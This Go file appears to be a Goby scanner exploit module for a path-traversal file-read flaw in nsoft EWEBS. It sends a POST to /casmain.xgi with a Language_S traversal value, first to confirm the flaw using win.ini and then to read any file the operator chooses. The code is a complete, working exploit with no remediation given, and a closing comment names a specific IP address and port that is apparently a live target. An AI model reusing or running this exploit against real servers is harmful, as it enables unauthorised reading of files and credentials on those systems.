package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "nsoft EWEBS casmain.xgi File Read",
    "Description": "nsoft EWEBS casmain.xgi File read, can read any file server",
    "Product": "JiTong EWEBS",
    "Homepage": "http://www.n-soft.com.cn/",
    "DisclosureDate": "2021-06-17",
    "Author": "PeiQi",
    "GobyQuery": "app=\"nsoft-EWEBS\" || app=\"nusoft Technology - Tong Tong EWEBS\"",
    "Level": "2",
    "Impact": "<p>File read</p>",
    "Recommendation": "<p>undefined</p>",
    "References": [
        "http://wiki.peiqi.tech"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "File",
            "type": "input",
            "value": "../../../../../../../windows/win.ini"
        }
    ],
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "File read"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "nsoft EWEBS"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10218"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/casmain.xgi"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "Language_S=../../../../../../../windows/win.ini"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "for 16-bit app support")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			file := ss.Params["File"].(string)
			uri := "/casmain.xgi"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "Language_S=" + file
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					Data := regexp.MustCompile(`([\s\S]+)<script>history`).FindStringSubmatch(resp.Utf8Html)[1]
					expResult.Output = Data
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

/* http://110.191.252.224:8000/ */
